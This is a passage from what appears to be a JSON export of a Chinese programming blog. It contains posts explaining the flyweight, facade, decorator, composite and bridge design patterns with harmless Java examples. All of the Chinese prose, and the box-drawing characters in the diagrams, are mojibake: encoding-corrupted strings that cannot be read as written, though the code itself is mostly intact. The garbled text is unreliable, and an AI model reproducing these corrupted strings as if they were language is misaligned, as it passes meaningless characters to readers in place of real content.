æ­¤ï¼Œäº«å…ƒæ¨¡å¼å°±æ˜¯é€šè¿‡å·¥å‚æ–¹æ³•åˆ›å»ºå¯¹è±¡ï¼Œåœ¨å·¥å‚æ–¹æ³•å†…éƒ¨ï¼Œå¾ˆå¯èƒ½è¿”å›ç¼“å­˜çš„å®ä¾‹ï¼Œè€Œä¸æ˜¯æ–°åˆ›å»ºå®ä¾‹ï¼Œä»è€Œå®ç°ä¸å¯å˜å®ä¾‹çš„å¤ç”¨ã€‚ æ€»æ˜¯ä½¿ç”¨å·¥å‚æ–¹æ³•è€Œä¸æ˜¯newæ“ä½œç¬¦åˆ›å»ºå®ä¾‹ï¼Œå¯è·å¾—äº«å…ƒæ¨¡å¼çš„å¥½å¤„ã€‚ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œäº«å…ƒæ¨¡å¼ä¸»è¦åº”ç”¨äºç¼“å­˜ï¼Œå³å®¢æˆ·ç«¯å¦‚æœé‡å¤è¯·æ±‚æŸäº›å¯¹è±¡ï¼Œä¸å¿…æ¯æ¬¡æŸ¥è¯¢æ•°æ®åº“æˆ–è€…è¯»å–æ–‡ä»¶ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›å†…å­˜ä¸­ç¼“å­˜çš„æ•°æ®ã€‚ æˆ‘ä»¬ä»¥Studentä¸ºä¾‹ï¼Œè®¾è®¡ä¸€ä¸ªé™æ€å·¥å‚æ–¹æ³•ï¼Œå®ƒåœ¨å†…éƒ¨å¯ä»¥è¿”å›ç¼“å­˜çš„å¯¹è±¡ï¼š public class Student { // æŒæœ‰ç¼“å­˜: private static final Map&lt;String, Student&gt; cache = new HashMap&lt;&gt;(); // é™æ€å·¥å‚æ–¹æ³•: public static Student create(int id, String name) { String key = id + &quot;\\n&quot; + name; // å…ˆæŸ¥æ‰¾ç¼“å­˜: Student std = cache.get(key); if (std == null) { // æœªæ‰¾åˆ°,åˆ›å»ºæ–°å¯¹è±¡: System.out.println(String.format(&quot;create new Student(%s, %s)&quot;, id, name)); std = new Student(id, name); // æ”¾å…¥ç¼“å­˜: cache.put(key, std); } else { // ç¼“å­˜ä¸­å­˜åœ¨: System.out.println(String.format(&quot;return cached Student(%s, %s)&quot;, std.id, std.name)); } return std; } private final int id; private final String name; public Student(int id, String name) { this.id = id; this.name = name; } } åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨æˆç†Ÿçš„ç¼“å­˜åº“ï¼Œä¾‹å¦‚Guavaçš„Cacheï¼Œå› ä¸ºå®ƒæä¾›äº†æœ€å¤§ç¼“å­˜æ•°é‡é™åˆ¶ã€å®šæ—¶è¿‡æœŸç­‰å®ç”¨åŠŸèƒ½ã€‚","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"å¤–è§‚æ¨¡å¼","slug":"å¤–è§‚æ¨¡å¼","date":"2020-06-08T23:37:54.000Z","updated":"2021-04-11T17:11:28.834Z","comments":true,"path":"å¤–è§‚æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/","excerpt":"å¤–è§‚æ¨¡å¼ ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ã€‚Facadeæ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ã€‚","text":"å¤–è§‚æ¨¡å¼ ä¸ºå­ç³»ç»Ÿä¸­çš„ä¸€ç»„æ¥å£æä¾›ä¸€ä¸ªä¸€è‡´çš„ç•Œé¢ã€‚Facadeæ¨¡å¼å®šä¹‰äº†ä¸€ä¸ªé«˜å±‚æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä½¿å¾—è¿™ä¸€å­ç³»ç»Ÿæ›´åŠ å®¹æ˜“ä½¿ç”¨ã€‚ å¤–è§‚æ¨¡å¼ï¼Œå³Facadeï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ¨¡å¼ã€‚å®ƒçš„åŸºæœ¬æ€æƒ³å¦‚ä¸‹ï¼š å¦‚æœå®¢æˆ·ç«¯è¦è·Ÿè®¸å¤šå­ç³»ç»Ÿæ‰“äº¤é“ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯éœ€è¦äº†è§£å„ä¸ªå­ç³»ç»Ÿçš„æ¥å£ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚å¦‚æœæœ‰ä¸€ä¸ªç»Ÿä¸€çš„â€œä¸­ä»‹â€ï¼Œè®©å®¢æˆ·ç«¯åªè·Ÿä¸­ä»‹æ‰“äº¤é“ï¼Œä¸­ä»‹å†å»è·Ÿå„ä¸ªå­ç³»ç»Ÿæ‰“äº¤é“ï¼Œå¯¹å®¢æˆ·ç«¯æ¥è¯´å°±æ¯”è¾ƒç®€å•ã€‚æ‰€ä»¥Facadeå°±ç›¸å½“äºæäº†ä¸€ä¸ªä¸­ä»‹ã€‚ æˆ‘ä»¬ä»¥æ³¨å†Œå…¬å¸ä¸ºä¾‹ï¼Œå‡è®¾æ³¨å†Œå…¬å¸éœ€è¦ä¸‰æ­¥ï¼š å‘å·¥å•†å±€ç”³è¯·å…¬å¸è¥ä¸šæ‰§ç…§ï¼› åœ¨é“¶è¡Œå¼€è®¾è´¦æˆ·ï¼› åœ¨ç¨åŠ¡å±€å¼€è®¾çº³ç¨å·ã€‚ ä»¥ä¸‹æ˜¯ä¸‰ä¸ªç³»ç»Ÿçš„æ¥å£ï¼š // å·¥å•†æ³¨å†Œ: public class AdminOfIndustry { public Company register(String name) { ... } } // é“¶è¡Œå¼€æˆ·: public class Bank { public String openAccount(String companyId) { ... } } // çº³ç¨ç™»è®°: public class Taxation { public String applyTaxCode(String companyId) { ... } } å¦‚æœå­ç³»ç»Ÿæ¯”è¾ƒå¤æ‚ï¼Œå¹¶ä¸”å®¢æˆ·å¯¹æµç¨‹ä¹Ÿä¸ç†Ÿæ‚‰ï¼Œé‚£å°±æŠŠè¿™äº›æµç¨‹å…¨éƒ¨å§”æ‰˜ç»™ä¸­ä»‹ï¼š public class Facade { public Company openCompany(String name) { Company c = this.admin.register(name); String bankAccount = this.bank.openAccount(c.getId()); c.setBankAccount(bankAccount); String taxCode = this.taxation.applyTaxCode(c.getId()); c.setTaxCode(taxCode); return c; } } è¿™æ ·ï¼Œå®¢æˆ·ç«¯åªè·ŸFacadeæ‰“äº¤é“ï¼Œä¸€æ¬¡å®Œæˆå…¬å¸æ³¨å†Œçš„æ‰€æœ‰ç¹çæµç¨‹ï¼š Company c = facade.openCompany(&quot;Facade Software Ltd.&quot;); å¾ˆå¤šWebç¨‹åºï¼Œå†…éƒ¨æœ‰å¤šä¸ªå­ç³»ç»Ÿæä¾›æœåŠ¡ï¼Œç»å¸¸ä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„Facadeå…¥å£ï¼Œä¾‹å¦‚ä¸€ä¸ªRestApiControllerï¼Œä½¿å¾—å¤–éƒ¨ç”¨æˆ·è°ƒç”¨çš„æ—¶å€™ï¼Œåªå…³å¿ƒFacadeæä¾›çš„æ¥å£ï¼Œä¸ç”¨ç®¡å†…éƒ¨åˆ°åº•æ˜¯å“ªä¸ªå­ç³»ç»Ÿå¤„ç†çš„ã€‚ æ›´å¤æ‚çš„Webç¨‹åºï¼Œä¼šæœ‰å¤šä¸ªWebæœåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œç»å¸¸ä¼šä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç½‘å…³å…¥å£æ¥è‡ªåŠ¨è½¬å‘åˆ°ä¸åŒçš„WebæœåŠ¡ï¼Œè¿™ç§æä¾›ç»Ÿä¸€å…¥å£çš„ç½‘å…³å°±æ˜¯Gatewayï¼Œå®ƒæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªFacadeï¼Œä½†å¯ä»¥é™„åŠ ä¸€äº›ç”¨æˆ·è®¤è¯ã€é™æµé™é€Ÿçš„é¢å¤–æœåŠ¡ã€‚","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"è£…é¥°å™¨æ¨¡å¼","slug":"è£…é¥°å™¨æ¨¡å¼","date":"2020-06-08T23:10:41.000Z","updated":"2021-04-11T17:11:29.010Z","comments":true,"path":"è£…é¥°å™¨æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"è£…é¥°å™¨æ¨¡å¼ åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ã€‚å°±å¢åŠ åŠŸèƒ½æ¥è¯´ï¼Œç›¸æ¯”ç”Ÿæˆå­ç±»æ›´ä¸ºçµæ´»ã€‚","text":"è£…é¥°å™¨æ¨¡å¼ åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ã€‚å°±å¢åŠ åŠŸèƒ½æ¥è¯´ï¼Œç›¸æ¯”ç”Ÿæˆå­ç±»æ›´ä¸ºçµæ´»ã€‚ è£…é¥°å™¨ï¼ˆDecoratorï¼‰æ¨¡å¼ï¼Œæ˜¯ä¸€ç§åœ¨è¿è¡ŒæœŸåŠ¨æ€ç»™æŸä¸ªå¯¹è±¡çš„å®ä¾‹å¢åŠ åŠŸèƒ½çš„æ–¹æ³•ã€‚ æˆ‘ä»¬åœ¨IOçš„Filteræ¨¡å¼ä¸€èŠ‚ä¸­å…¶å®å·²ç»è®²è¿‡è£…é¥°å™¨æ¨¡å¼äº†ã€‚åœ¨Javaæ ‡å‡†åº“ä¸­ï¼ŒInputStreamæ˜¯æŠ½è±¡ç±»ï¼ŒFileInputStreamã€ServletInputStreamã€Socket.getInputStream()è¿™äº›InputStreaméƒ½æ˜¯æœ€ç»ˆæ•°æ®æºã€‚ ç°åœ¨ï¼Œå¦‚æœè¦ç»™ä¸åŒçš„æœ€ç»ˆæ•°æ®æºå¢åŠ ç¼“å†²åŠŸèƒ½ã€è®¡ç®—ç­¾ååŠŸèƒ½ã€åŠ å¯†è§£å¯†åŠŸèƒ½ï¼Œé‚£ä¹ˆï¼Œ3ä¸ªæœ€ç»ˆæ•°æ®æºã€3ç§åŠŸèƒ½ä¸€å…±éœ€è¦9ä¸ªå­ç±»ã€‚å¦‚æœç»§ç»­å¢åŠ æœ€ç»ˆæ•°æ®æºï¼Œæˆ–è€…å¢åŠ æ–°åŠŸèƒ½ï¼Œå­ç±»ä¼šçˆ†ç‚¸å¼å¢é•¿ï¼Œè¿™ç§è®¾è®¡æ–¹å¼æ˜¾ç„¶æ˜¯ä¸å¯å–çš„ã€‚ Decoratoræ¨¡å¼çš„ç›®çš„å°±æ˜¯æŠŠä¸€ä¸ªä¸€ä¸ªçš„é™„åŠ åŠŸèƒ½ï¼Œç”¨Decoratorçš„æ–¹å¼ç»™ä¸€å±‚ä¸€å±‚åœ°ç´¯åŠ åˆ°åŸå§‹æ•°æ®æºä¸Šï¼Œæœ€ç»ˆï¼Œé€šè¿‡ç»„åˆè·å¾—æˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ã€‚ ä¾‹å¦‚ï¼šç»™FileInputStreamå¢åŠ ç¼“å†²å’Œè§£å‹ç¼©åŠŸèƒ½ï¼Œç”¨Decoratoræ¨¡å¼å†™å‡ºæ¥å¦‚ä¸‹ï¼š // åˆ›å»ºåŸå§‹çš„æ•°æ®æº: InputStream fis = new FileInputStream(&quot;test.gz&quot;); // å¢åŠ ç¼“å†²åŠŸèƒ½: InputStream bis = new BufferedInputStream(fis); // å¢åŠ è§£å‹ç¼©åŠŸèƒ½: InputStream gis = new GZIPInputStream(bis); æˆ–è€…ä¸€æ¬¡æ€§å†™æˆè¿™æ ·ï¼š InputStream input = new GZIPInputStream( // ç¬¬äºŒå±‚è£…é¥° new BufferedInputStream( // ç¬¬ä¸€å±‚è£…é¥° new FileInputStream(&quot;test.gz&quot;) // æ ¸å¿ƒåŠŸèƒ½ )); è§‚å¯ŸBufferedInputStreamå’ŒGZIPInputStreamï¼Œå®ƒä»¬å®é™…ä¸Šéƒ½æ˜¯ä»FilterInputStreamç»§æ‰¿çš„ï¼Œè¿™ä¸ªFilterInputStreamå°±æ˜¯ä¸€ä¸ªæŠ½è±¡çš„Decoratorã€‚æˆ‘ä»¬ç”¨å›¾æŠŠDecoratoræ¨¡å¼ç”»å‡ºæ¥å¦‚ä¸‹ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Component â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ComponentA â”‚â”‚ComponentB â”‚... â”‚ Decorator â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚DecoratorA â”‚ â”‚DecoratorB â”‚... â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ æœ€é¡¶å±‚çš„Componentæ˜¯æ¥å£ï¼Œå¯¹åº”åˆ°IOçš„å°±æ˜¯InputStreamè¿™ä¸ªæŠ½è±¡ç±»ã€‚ComponentAã€ComponentBæ˜¯å®é™…çš„å­ç±»ï¼Œå¯¹åº”åˆ°IOçš„å°±æ˜¯FileInputStreamã€ServletInputStreamè¿™äº›æ•°æ®æºã€‚Decoratoræ˜¯ç”¨äºå®ç°å„ä¸ªé™„åŠ åŠŸèƒ½çš„æŠ½è±¡è£…é¥°å™¨ï¼Œå¯¹åº”åˆ°IOçš„å°±æ˜¯FilterInputStreamã€‚è€Œä»Decoratoræ´¾ç”Ÿçš„å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„è£…é¥°å™¨ï¼Œå®ƒä»¬æ¯ä¸ªéƒ½æœ‰ç‹¬ç«‹çš„åŠŸèƒ½ï¼Œå¯¹åº”åˆ°IOçš„å°±æ˜¯BufferedInputStreamã€GZIPInputStreamç­‰ã€‚ Decoratoræ¨¡å¼æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿå®ƒå®é™…ä¸ŠæŠŠæ ¸å¿ƒåŠŸèƒ½å’Œé™„åŠ åŠŸèƒ½ç»™åˆ†å¼€äº†ã€‚æ ¸å¿ƒåŠŸèƒ½æŒ‡FileInputStreamè¿™äº›çœŸæ­£è¯»æ•°æ®çš„æºå¤´ï¼Œé™„åŠ åŠŸèƒ½æŒ‡åŠ ç¼“å†²ã€å‹ç¼©ã€è§£å¯†è¿™äº›åŠŸèƒ½ã€‚å¦‚æœæˆ‘ä»¬è¦æ–°å¢æ ¸å¿ƒåŠŸèƒ½ï¼Œå°±å¢åŠ Componentçš„å­ç±»ï¼Œä¾‹å¦‚ByteInputStreamã€‚å¦‚æœæˆ‘ä»¬è¦å¢åŠ é™„åŠ åŠŸèƒ½ï¼Œå°±å¢åŠ Decoratorçš„å­ç±»ï¼Œä¾‹å¦‚CipherInputStreamã€‚ä¸¤éƒ¨åˆ†éƒ½å¯ä»¥ç‹¬ç«‹åœ°æ‰©å±•ï¼Œè€Œå…·ä½“å¦‚ä½•é™„åŠ åŠŸèƒ½ï¼Œç”±è°ƒç”¨æ–¹è‡ªç”±ç»„åˆï¼Œä»è€Œæå¤§åœ°å¢å¼ºäº†çµæ´»æ€§ã€‚ å¦‚æœæˆ‘ä»¬è¦è‡ªå·±è®¾è®¡å®Œæ•´çš„Decoratoræ¨¡å¼ï¼Œåº”è¯¥å¦‚ä½•è®¾è®¡ï¼Ÿ æˆ‘ä»¬è¿˜æ˜¯ä¸¾ä¸ªæ —å­ï¼šå‡è®¾æˆ‘ä»¬éœ€è¦æ¸²æŸ“ä¸€ä¸ªHTMLçš„æ–‡æœ¬ï¼Œä½†æ˜¯æ–‡æœ¬è¿˜å¯ä»¥é™„åŠ ä¸€äº›æ•ˆæœï¼Œæ¯”å¦‚åŠ ç²—ã€å˜æ–œä½“ã€åŠ ä¸‹åˆ’çº¿ç­‰ã€‚ä¸ºäº†å®ç°åŠ¨æ€é™„åŠ æ•ˆæœï¼Œå¯ä»¥é‡‡ç”¨Decoratoræ¨¡å¼ã€‚ é¦–å…ˆï¼Œä»ç„¶éœ€è¦å®šä¹‰é¡¶å±‚æ¥å£TextNodeï¼š public interface TextNode { // è®¾ç½®text: void setText(String text); // è·å–text: String getText(); } å¯¹äºæ ¸å¿ƒèŠ‚ç‚¹ï¼Œä¾‹å¦‚`ï¼Œå®ƒéœ€è¦ä»TextNode`ç›´æ¥ç»§æ‰¿ï¼š public class SpanNode implements TextNode { private String text; public void setText(String text) { this.text = text; } public String getText() { return &quot;&lt;span&gt;&quot; + text + &quot;&lt;/span&gt;&quot;; } } ç´§æ¥ç€ï¼Œä¸ºäº†å®ç°Decoratoræ¨¡å¼ï¼Œéœ€è¦æœ‰ä¸€ä¸ªæŠ½è±¡çš„Decoratorç±»ï¼š public abstract class NodeDecorator implements TextNode { protected final TextNode target; protected NodeDecorator(TextNode target) { this.target = target; } public void setText(String text) { this.target.setText(text); } } è¿™ä¸ªNodeDecoratorç±»çš„æ ¸å¿ƒæ˜¯æŒæœ‰ä¸€ä¸ªTextNodeï¼Œå³å°†è¦æŠŠåŠŸèƒ½é™„åŠ åˆ°çš„TextNodeå®ä¾‹ã€‚æ¥ä¸‹æ¥å°±å¯ä»¥å†™ä¸€ä¸ªåŠ ç²—åŠŸèƒ½ï¼š public class BoldDecorator extends NodeDecorator { public BoldDecorator(TextNode target) { super(target); } public String getText() { return &quot;&lt;b&gt;&quot; + target.getText() + &quot;&lt;/b&gt;&quot;; } } ç±»ä¼¼çš„ï¼Œå¯ä»¥ç»§ç»­åŠ ItalicDecoratorã€UnderlineDecoratorç­‰ã€‚å®¢æˆ·ç«¯å¯ä»¥è‡ªç”±ç»„åˆè¿™äº›Decoratorï¼š TextNode n1 = new SpanNode(); TextNode n2 = new BoldDecorator(new UnderlineDecorator(new SpanNode())); TextNode n3 = new ItalicDecorator(new BoldDecorator(new SpanNode())); n1.setText(&quot;Hello&quot;); n2.setText(&quot;Decorated&quot;); n3.setText(&quot;World&quot;); System.out.println(n1.getText()); // è¾“å‡º&lt;span&gt;Hello&lt;/span&gt; System.out.println(n2.getText()); // è¾“å‡º&lt;b&gt;&lt;u&gt;&lt;span&gt;Decorated&lt;/span&gt;&lt;/u&gt;&lt;/b&gt; System.out.println(n3.getText()); // è¾“å‡º&lt;i&gt;&lt;b&gt;&lt;span&gt;World&lt;/span&gt;&lt;/b&gt;&lt;/i&gt;","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"ç»„åˆæ¨¡å¼","slug":"ç»„åˆæ¨¡å¼","date":"2020-06-08T22:39:48.000Z","updated":"2021-04-11T17:11:28.990Z","comments":true,"path":"ç»„åˆæ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/","excerpt":"ç»„åˆæ¨¡å¼ å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤ºâ€œéƒ¨åˆ†-æ•´ä½“â€çš„å±‚æ¬¡ç»“æ„ï¼Œä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ã€‚","text":"ç»„åˆæ¨¡å¼ å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤ºâ€œéƒ¨åˆ†-æ•´ä½“â€çš„å±‚æ¬¡ç»“æ„ï¼Œä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ã€‚ ç»„åˆæ¨¡å¼ï¼ˆCompositeï¼‰ç»å¸¸ç”¨äºæ ‘å½¢ç»“æ„ï¼Œä¸ºäº†ç®€åŒ–ä»£ç ï¼Œä½¿ç”¨Compositeå¯ä»¥æŠŠä¸€ä¸ªå¶å­èŠ‚ç‚¹ä¸ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ç»Ÿä¸€èµ·æ¥å¤„ç†ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ã€‚åœ¨XMLæˆ–HTMLä¸­ï¼Œä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½å¯èƒ½åŒ…å«ä»»æ„ä¸ªå…¶ä»–èŠ‚ç‚¹ï¼Œè¿™äº›å±‚å±‚åµŒå¥—çš„èŠ‚ç‚¹å°±æ„æˆäº†ä¸€é¢—æ ‘ã€‚ è¦ä»¥æ ‘çš„ç»“æ„è¡¨ç¤ºXMLï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæŠ½è±¡å‡ºèŠ‚ç‚¹ç±»å‹Nodeï¼š public interface Node { // æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹ä¸ºå­èŠ‚ç‚¹: Node add(Node node); // è·å–å­èŠ‚ç‚¹: List&lt;Node&gt; children(); // è¾“å‡ºä¸ºXML: String toXml(); } å¯¹äºä¸€ä¸ªè¿™æ ·çš„èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º ElementNodeï¼Œå®ƒå¯ä»¥ä½œä¸ºå®¹å™¨åŒ…å«å¤šä¸ªå­èŠ‚ç‚¹ï¼š public class ElementNode implements Node { private String name; private List&lt;Node&gt; list = new ArrayList&lt;&gt;(); public ElementNode(String name) { this.name = name; } public Node add(Node node) { list.add(node); return this; } public List&lt;Node&gt; children() { return list; } public String toXml() { String start = &quot;&lt;&quot; + name + &quot;&gt;\\n&quot;; String end = &quot;&lt;/&quot; + name + &quot;&gt;\\n&quot;; StringJoiner sj = new StringJoiner(&quot;&quot;, start, end); list.forEach(node -&gt; { sj.add(node.toXml() + &quot;\\n&quot;); }); return sj.toString(); } } å¯¹äºæ™®é€šæ–‡æœ¬ï¼Œæˆ‘ä»¬æŠŠå®ƒçœ‹ä½œTextNodeï¼Œå®ƒæ²¡æœ‰å­èŠ‚ç‚¹ï¼š public class TextNode implements Node { private String text; public TextNode(String text) { this.text = text; } public Node add(Node node) { throw new UnsupportedOperationException(); } public List&lt;Node&gt; children() { return List.of(); } public String toXml() { return text; } } æ­¤å¤–ï¼Œè¿˜å¯ä»¥æœ‰æ³¨é‡ŠèŠ‚ç‚¹ï¼š public class CommentNode implements Node { private String text; public CommentNode(String text) { this.text = text; } public Node add(Node node) { throw new UnsupportedOperationException(); } public List&lt;Node&gt; children() { return List.of(); } public String toXml() { return &quot;&lt;!-- &quot; + text + &quot; --&gt;&quot;; } } é€šè¿‡ElementNodeã€TextNodeå’ŒCommentNodeï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºä¸€é¢—æ ‘ï¼š Node root = new ElementNode(&quot;school&quot;); root.add(new ElementNode(&quot;classA&quot;) .add(new TextNode(&quot;Tom&quot;)) .add(new TextNode(&quot;Alice&quot;))); root.add(new ElementNode(&quot;classB&quot;) .add(new TextNode(&quot;Bob&quot;)) .add(new TextNode(&quot;Grace&quot;)) .add(new CommentNode(&quot;comment...&quot;))); System.out.println(root.toXml()); æœ€åé€šè¿‡rootèŠ‚ç‚¹è¾“å‡ºçš„XMLå¦‚ä¸‹ï¼š &lt;school&gt; &lt;classA&gt; Tom Alice &lt;/classA&gt; &lt;classB&gt; Bob Grace &lt;!-- comment... --&gt; &lt;/classB&gt; &lt;/school&gt; å¯è§ï¼Œä½¿ç”¨Compositeæ¨¡å¼æ—¶ï¼Œéœ€è¦å…ˆç»Ÿä¸€å•ä¸ªèŠ‚ç‚¹ä»¥åŠâ€œå®¹å™¨â€èŠ‚ç‚¹çš„æ¥å£ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ Node â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â–² â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ElementNodeâ”‚â”‚ TextNode â”‚â”‚CommentNodeâ”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ ä½œä¸ºå®¹å™¨èŠ‚ç‚¹çš„ElementNodeåˆå¯ä»¥æ·»åŠ ä»»æ„ä¸ªNodeï¼Œè¿™æ ·å°±å¯ä»¥æ„æˆå±‚çº§ç»“æ„ã€‚ ç±»ä¼¼çš„ï¼Œåƒæ–‡ä»¶å¤¹å’Œæ–‡ä»¶ã€GUIçª—å£çš„å„ç§ç»„ä»¶ï¼Œéƒ½ç¬¦åˆCompositeæ¨¡å¼çš„å®šä¹‰ï¼Œå› ä¸ºå®ƒä»¬çš„ç»“æ„å¤©ç”Ÿå°±æ˜¯å±‚çº§ç»“æ„ã€‚","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"æ¡¥æ¥æ¨¡å¼","slug":"æ¡¥æ¥æ¨¡å¼","date":"2020-06-08T22:04:02.000Z","updated":"2021-04-11T17:11:28.931Z","comments":true,"path":"æ¡¥æ¥æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/","excerpt":"æ¡¥æ¥æ¨¡å¼ å°†æŠ½è±¡éƒ¨åˆ†ä¸å®ƒçš„å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿å®ƒä»¬éƒ½å¯ä»¥ç‹¬ç«‹åœ°å˜åŒ–ã€‚","text":"æ¡¥æ¥æ¨¡å¼ å°†æŠ½è±¡éƒ¨åˆ†ä¸å®ƒçš„å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿å®ƒä»¬éƒ½å¯ä»¥ç‹¬ç«‹åœ°å˜åŒ–ã€‚ å‡è®¾æŸä¸ªæ±½è½¦å‚å•†ç”Ÿäº§ä¸‰ç§å“ç‰Œçš„æ±½è½¦ï¼šBigã€Tinyå’ŒBossï¼Œæ¯ç§å“ç‰Œåˆå¯ä»¥é€‰æ‹©ç‡ƒæ²¹ã€çº¯ç”µå’Œæ··åˆåŠ¨åŠ›ã€‚å¦‚æœç”¨ä¼ ç»Ÿçš„ç»§æ‰¿æ¥è¡¨ç¤ºå„ä¸ªæœ€ç»ˆè½¦å‹ï¼Œä¸€å…±æœ‰3ä¸ªæŠ½è±¡ç±»åŠ 9ä¸ªæœ€ç»ˆå­ç±»ï¼š â”Œâ”€â”€â”€â”€â”€â”€â”€â” â”‚ Car â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”˜ â–² 